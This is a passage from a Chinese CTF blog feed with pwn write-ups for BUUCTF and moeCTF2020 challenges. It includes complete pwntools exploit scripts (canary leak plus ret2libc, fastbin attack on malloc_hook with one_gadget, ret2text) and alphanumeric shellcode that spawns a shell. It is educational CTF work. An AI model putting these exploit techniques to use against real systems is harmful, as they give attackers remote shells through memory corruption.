class="string">'puts'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行即可get shell</p><p><img src="https://i.loli.net/2020/12/04/GmnYAjS7r6DUbpC.png" alt="image.png"></p><h1 id="0x02E-bjdctf-2020-babyrop2-fmtstr-ret2libc"><a href="#0x02E-bjdctf-2020-babyrop2-fmtstr-ret2libc" class="headerlink" title="0x02E.bjdctf_2020_babyrop2 - fmtstr + ret2libc"></a>0x02E.bjdctf_2020_babyrop2 - fmtstr + ret2libc</h1><p>惯例的<code>checksec</code>，开了NX和canary</p><p><img src="https://i.loli.net/2020/12/04/uH6V1kLP3M5TizI.png" alt="image.png"></p><p>在gift函数中可以泄露canary</p><p><img src="https://i.loli.net/2020/12/04/K7psfAMFocnalTy.png" alt="image.png"></p><p>在vuln中直接就有一个溢出</p><p><img src="https://i.loli.net/2020/12/04/XHYVtGCxol92dNE.png" alt="image.png"></p><p>那么先泄露canary再ret2libc即可</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bjdctf_2020_babyrop2'</span>) <span class="comment"># remote('node3.buuoj.cn', 26028)</span></span><br><span class="line">e = ELF(<span class="string">'./bjdctf_2020_babyrop2'</span>)</span><br><span class="line">offset = <span class="number">0x20</span> - <span class="number">8</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400993</span></span><br><span class="line"><span class="comment">#context.log_level = 'DEBUG'</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'%7$p'</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">canary = int(p.recvuntil(<span class="string">'\n'</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span> * offset + p64(canary) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(e.got[<span class="string">'puts'</span>]) + p64(e.plt[<span class="string">'puts'</span>]) + p64(e.sym[<span class="string">'vuln'</span>])</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b'A'</span> * offset + p64(canary) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行即可getshell</p><p><img src="https://i.loli.net/2020/12/04/rScmVH2X87ob5iB.png" alt="image.png"></p><h1 id="0x02F-jarvisoj-test-your-memory-ret2text"><a href="#0x02F-jarvisoj-test-your-memory-ret2text" class="headerlink" title="0x02F.jarvisoj_test_your_memory - ret2text"></a>0x02F.jarvisoj_test_your_memory - ret2text</h1><p>惯例的<code>checksec</code>， 只开了NX保护</p><p><img src="https://i.loli.net/2020/12/04/RuA5Pk3QrJqXKHd.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/12/04/IefOqdQ4E6yBMKZ.png" alt="image.png"></p><p>存在溢出</p><p><img src="https://i.loli.net/2020/12/04/gXN7KSE3T4dzLob.png" alt="image.png"></p><p>存在system函数</p><p><img src="https://i.loli.net/2020/12/04/l7ST1q2FcrGWbUM.png" alt="image.png"></p><p>存在一个<code>cat flag</code>字符串</p><p>那直接system(“cat flag”)就行了</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行即可得到flag</p><p><img src="https://i.loli.net/2020/12/04/uZlcnrhgJo23zpW.png" alt="image.png"></p><blockquote><p>注：这道题很坑，题目给的二进制文件和部署在服务器上的二进制文件大相径庭，所以没能get shell…</p></blockquote><h1 id="0x30-ZJCTF-2019-Login"><a href="#0x30-ZJCTF-2019-Login" class="headerlink" title="0x30.[ZJCTF 2019]Login -"></a>0x30.[ZJCTF 2019]Login -</h1><h1 id="0x-0ctf-2017-babyheap-Unsorted-bin-leak-Fastbin-Attack-one-gadget"><a href="#0x-0ctf-2017-babyheap-Unsorted-bin-leak-Fastbin-Attack-one-gadget" class="headerlink" title="0x???.0ctf_2017_babyheap - Unsorted bin leak + Fastbin Attack + one_gadget"></a>0x???.0ctf_2017_babyheap - Unsorted bin leak + Fastbin Attack + one_gadget</h1><p>出现重复的题是真的离谱</p><p>过程见前面0x013，这里就不再赘叙了</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27143</span>)<span class="comment">#process('./babyheap_0ctf_2017')#</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size:int)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(index:int,content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line">    </span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#idx1</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment">#idx2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1, the former idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2, the former idx4</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx5, prevent the top chunk combine it</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into unsorted bin, fd points to the main_arena</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)) - <span class="number">0x58</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into fastbin</span></span><br><span class="line">payload = p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload) <span class="comment">#overwrite fd to fake chunk addr</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx6, our fake chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/19/kJSyCIWmsLdoaOD.png" alt="image.png"></p><h1 id="0x-mrctf2020-easyrop-ret2text"><a href="#0x-mrctf2020-easyrop-ret2text" class="headerlink" title="0x???.mrctf2020_easyrop - ret2text"></a>0x???.mrctf2020_easyrop - ret2text</h1><blockquote><p>从比较靠后的无人区挑了一道简单题来做2333（<del>为了混分</del></p></blockquote><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/10/07/9iQUjlYXTmzAKoB.png" alt="image.png"></p><p>主函数中根据我们所输入的数字进入不同的函数，输入7则在进入相应的函数之后退出</p><p><img src="https://i.loli.net/2020/10/07/zrNR46ytfJ2gcDq.png" alt="image.png"></p><p>同时我们可以发现存在能够直接getshell的gadget</p><p><img src="https://i.loli.net/2020/10/07/LXQr9f2BShwG1bC.png" alt="image.png"></p><p>虽然说几个函数都是向main中的v5上写入，但是最大的一个函数仅可以写入<code>0x300</code>字节，溢出到rbp要<code>0x310</code>字节</p><p><img src="https://i.loli.net/2020/10/07/wzrb1uSvc49oaeO.png" alt="image.png"></p><p>不过我们可以发现，在<code>byby()</code>函数中程序会将v5看作为一个字符串，并在字符串末尾开始读入用户输入</p><p><img src="https://i.loli.net/2020/10/07/QDHPlT9WFS3gx6K.png" alt="image.png"></p><p>由于<code>hehe()</code>能够读入0x300字节，故我们考虑先使用<code>hehe()</code>函数构造一个长度为0x2ff的字符串，再调用<code>byby()</code>函数进行读入，便可以溢出控制主函数的返回地址返回至<code>system(&quot;/bin/sh&quot;)</code></p><p>故构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29482</span>)<span class="comment">#process('./mrctf2020_easyrop')#</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b'A'</span>*(<span class="number">0x300</span><span class="number">-1</span>)+<span class="string">b'\x00'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">'7'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b'A'</span>*<span class="number">0x11</span>+p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x40072a</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行脚本即得flag</p><p><img src="https://i.loli.net/2020/10/07/TwVOht7dcnsZzbN.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x000-绪论&quot;&gt;&lt;a href=&quot;#0x000-绪论&quot; class=&quot;headerlink&quot; title=&quot;0x000.绪论&quot;&gt;&lt;/a&gt;0x000.绪论&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;buuoj.cn&quot;&gt;BUUCTF&lt;/a&gt;是一个巨型CTF题库，大致可以类比OIer们的洛谷一样的地方，在BUUCTF上有着分类齐全数量庞大的各方向题目，包括各大CTF的原题&lt;/p&gt;
&lt;p&gt;正所谓”不刷BUU非CTFer“（&lt;del&gt;哪里有过这种奇怪的话啦&lt;/del&gt;），作为一名新晋的蒟蒻CTFer&amp;amp;网安专业选手，咱也来做一做BUUCTF上的题，并把题解在博客上存档一份方便后来者学习（&lt;del&gt;快醒醒，哪里会有人看你的博客啦XD&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;Baby Pwner做的都是pwn题，点开即可查看题解👇&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注：我会在题目的旁边写上考点&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="信息安全" scheme="http://archive.next.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="PWN" scheme="http://archive.next.arttnba3.cn/tags/PWN/"/>
    
    <category term="堆" scheme="http://archive.next.arttnba3.cn/tags/%E5%A0%86/"/>
    
    <category term="ROP" scheme="http://archive.next.arttnba3.cn/tags/ROP/"/>
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/tags/CTF/"/>
    
    <category term="ret2text" scheme="http://archive.next.arttnba3.cn/tags/ret2text/"/>
    
    <category term="python" scheme="http://archive.next.arttnba3.cn/tags/python/"/>
    
    <category term="栈迁移" scheme="http://archive.next.arttnba3.cn/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    
    <category term="ret2csu" scheme="http://archive.next.arttnba3.cn/tags/ret2csu/"/>
    
    <category term="ret2libc" scheme="http://archive.next.arttnba3.cn/tags/ret2libc/"/>
    
    <category term="Integer Overflow" scheme="http://archive.next.arttnba3.cn/tags/Integer-Overflow/"/>
    
    <category term="Fastbin Attack" scheme="http://archive.next.arttnba3.cn/tags/Fastbin-Attack/"/>
    
    <category term="Unsorted bin Attack" scheme="http://archive.next.arttnba3.cn/tags/Unsorted-bin-Attack/"/>
    
    <category term="one_gadget" scheme="http://archive.next.arttnba3.cn/tags/one-gadget/"/>
    
    <category term="SROP" scheme="http://archive.next.arttnba3.cn/tags/SROP/"/>
    
    <category term="canary" scheme="http://archive.next.arttnba3.cn/tags/canary/"/>
    
    <category term="got表劫持" scheme="http://archive.next.arttnba3.cn/tags/got%E8%A1%A8%E5%8A%AB%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>【CTF题解-0x03】moeCTF2020-partial official write up by arttnb3</title>
    <link href="http://archive.next.arttnba3.cn/2020/09/07/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x03%E3%80%91moeCTF2020-write-up-by-arttnb3/"/>
    <id>http://archive.next.arttnba3.cn/2020/09/07/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x03%E3%80%91moeCTF2020-write-up-by-arttnb3/</id>
    <published>2020-09-06T20:44:37.000Z</published>
    <updated>2020-11-20T06:18:13.876Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p>很荣幸能和RX大哥以及诸位带师傅共同出了moeCTF2020的题目，也希望做题的各位能够获得快乐XD</p><p>闲话不多说，点开即可查看题解👇</p><blockquote><p>注：原题皆可在本页面直接下载</p></blockquote><a id="more"></a><h1 id="0x01-Pwn"><a href="#0x01-Pwn" class="headerlink" title="0x01.Pwn"></a>0x01.Pwn</h1><h2 id="Pwn从入门到入狱"><a href="#Pwn从入门到入狱" class="headerlink" title="Pwn从入门到入狱"></a>Pwn从入门到入狱</h2><blockquote><p>注：0基础新人还请仔细阅读<a href="https://archive.next.arttnba3.cn/2020/09/17/%E3%80%90CTF%E8%B5%84%E6%96%99-0x0001%E3%80%91moeCTF2020-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1%20by%20arttnba3/">这一份文件</a></p></blockquote><p>在文件末尾可以看到白给的flag</p><p><img src="https://i.loli.net/2020/10/08/xPJRSKz7MhOWn8I.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;PWN_T0_0WN!&#125;</span><br></pre></td></tr></table></figure><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>nc，提示<code>Please fill me up</code>，考虑到栈溢出，直接输出一长串随机字符串获得flag</p><p><img src="https://i.loli.net/2020/08/01/frusiYZlnD39J4U.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;W3lc0m3_t0_tH3_w0r1d_0f_PWN!&#125;</span><br></pre></td></tr></table></figure><h2 id="Baby-Pwn-ret2text"><a href="#Baby-Pwn-ret2text" class="headerlink" title="Baby Pwn - ret2text"></a>Baby Pwn - ret2text</h2><p> <a href="/download/moectf2020/pwn/baby_pwn/pwn1"点击此处下载原题"">点击下载-pwn1</a> </p><p>在IDA里我们很容易看得到存在字符串溢出漏洞</p><p><img src="https://i.loli.net/2020/08/01/beydF6oiDAhQf4H.png" alt="image.png"></p><p>同样的，我们可以看到在<code>.text</code>段存在可以被利用的<code>backdoor()</code>函数，易知该题可通过栈溢出覆写返回地址至<code>backdoor()</code>函数以getshell，是为一道很经典的ret2text</p><p><img src="https://i.loli.net/2020/08/01/gDxUeytZdFS7Ph5.png" alt="image.png"></p><p>相对于rbp的偏移量为0x40+8 = 72</p><p><img src="https://i.loli.net/2020/08/06/DqfQil7cmT6xIrS.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/08/06/X3YgIDKSVhWRJm5.png" alt="image.png"></p><p>故构造如下payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'pwn1'</span>)<span class="comment">#p = remote('sec.eqqie.cn',10003)</span></span><br><span class="line">pl = <span class="string">'A'</span>*<span class="number">72</span> + p64(<span class="number">0x400676</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(pl)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/01/JplCRSkxYLyEDKO.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;a0e65c41-fe8a-4db9-a070-f6593a5858c3&#125;</span><br></pre></td></tr></table></figure><h2 id="Baby-Shellcode-shellcode"><a href="#Baby-Shellcode-shellcode" class="headerlink" title="Baby Shellcode - shellcode"></a>Baby Shellcode - shellcode</h2><p> <a href="/download/moectf2020/pwn/baby_shellcode/baby_shellcode"点击此处下载原题"">点击下载-baby_shellcode</a> </p><p>拖进IDA可以看到这道题本地只有一个输出语句和一个输入语句</p><p><img src="https://i.loli.net/2020/08/01/5fahTbeGgDlwNWt.png" alt="image.png"></p><p>我们可以看到程序读入我们的输入后直接尝试将我们的输入作为代码来执行，因此我们直接构造getshell的shellcode输入即可</p><p>使用<strong>asm(shellcraft.sh())</strong>可以直接获取一段shellcode</p><p><img src="https://i.loli.net/2020/09/15/kB9NEsTiAfwXSnz.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;D0_yoU_kN0w_she11c0d3?&#125;</span><br></pre></td></tr></table></figure><h2 id="unusual-shellcode-Alphanumeric-Shellcode"><a href="#unusual-shellcode-Alphanumeric-Shellcode" class="headerlink" title="unusual shellcode - Alphanumeric Shellcode"></a>unusual shellcode - Alphanumeric Shellcode</h2><p> <a href="/download/moectf2020/pwn/unusual/unusual"点击此处下载原题"">点击下载-unusual</a> </p><p>首先是惯例的<code>checksec</code></p><p><img src="https://i.loli.net/2020/10/08/cdTow3X5p6WUAHk.png" alt="image.png"></p><p>除了地址随机化以外其他的都开满了</p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/08/10/CTInhxDcJqsORVy.png" alt="image.png"></p><p>v7是一个函数指针，并被分配到了<code>0x1000</code>大小的内存空间</p><p>程序会从输入流逐字节读入最大4096个字节写入到v7所指向的空间上，且限制输入仅能为字母或数字否则终止输入</p><p>输入结束后尝试执行函数指针v7</p><p>那么我们直接输入一段shellcode即可getshell</p><p>但是限制了输入只能是数字和字母，常见的shellcode都包含一些其他字符</p><p>这个时候我们可以尝试百度XD</p><p><img src="https://i.loli.net/2020/08/10/xptnlBUTFKISRsD.png" alt="image.png"></p><p>得知一种叫做<strong>Alphanumeric Shellcode</strong>的东西www</p><p>具体参见：<a href="https://www.freebuf.com/articles/system/232280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/232280.html</a></p><p>首先从GitHub上随便找一个轮子</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/TaQini/alpha3.git</span><br></pre></td></tr></table></figure><p>然后编写生成我们的shellcode的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sc.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">sc = shellcraft.sh()</span><br><span class="line"><span class="keyword">print</span> asm(sc)</span><br></pre></td></tr></table></figure><p>输出重定向至文本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python sc.py &gt; sc</span><br></pre></td></tr></table></figure><p>使用轮子生成alphanumeric shellcode</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python ./ALPHA3.py x64 ascii mixedcase rax --input=<span class="string">"sc"</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/10/Bg5T7zeZVOWsJ9K.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00</span><br></pre></td></tr></table></figure><p>连接服务端，发送我们的alphanumeric shellcode，成功getshell</p><p><img src="https://i.loli.net/2020/08/10/b5Ru7PmDZasA1jI.png" alt="image.png"></p><p>得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Y0u_kn3w_tH3_a1ph4num3r1C_she1lc0de!&#125;</span><br></pre></td></tr></table></figure><h2 id="ROP1-ret2text"><a href="#ROP1-ret2text" class="headerlink" title="ROP1 - ret2text"></a>ROP1 - ret2text</h2><p> <a href="/download/moectf2020/pwn/rop1/rop1"点击此处下载原题"">点击下载-rop1</a> </p><p>ROP即为<strong>Return-Oriented Programming ——返回导向编程</strong>， 是一种可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）的高级的内存攻击技术。</p><blockquote><p>其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。 </p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/" target="_blank" rel="noopener">ctf-wifi：Basic ROP</a></p></blockquote><p>首先在Linux下使用<code>checksec</code>指令分析，发现其开启了<strong>栈不可执行保护</strong></p><p><img src="https://i.loli.net/2020/08/06/CmTilx3bQBschY8.png" alt="image.png"></p><p>将程序拖入IDA分析，发现存在<code>gets</code>函数，很明显存在栈溢出</p><p><img src="https://i.loli.net/2020/08/06/rfdg523GS6IOy7k.png" alt="image.png"></p><p>我们尝试将断点下在<code>call _gets</code>，即<code>0x40087f</code>的地以计算偏移量</p><p><img src="https://i.loli.net/2020/08/06/1pKo5GdSW3Jf42u.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gdb</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> file rop1</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> b *0x40087f</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> r</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/06/oQREW8CdHIU59ai.png" alt="image.png"></p><p>由<code>lea rax, [rbp-0x80]</code>我们可以看到该字符串为基于rbp的索引，故其相对于返回地址的偏移即为<code>0x80+8</code>，也就是<strong>128个字节再加上8字节的rbp</strong>，之后就是<strong>函数的返回地址</strong></p><p>因此我们构造的payload基础模型应当是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">target_addr = p64(addr_of_target)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">128</span> + 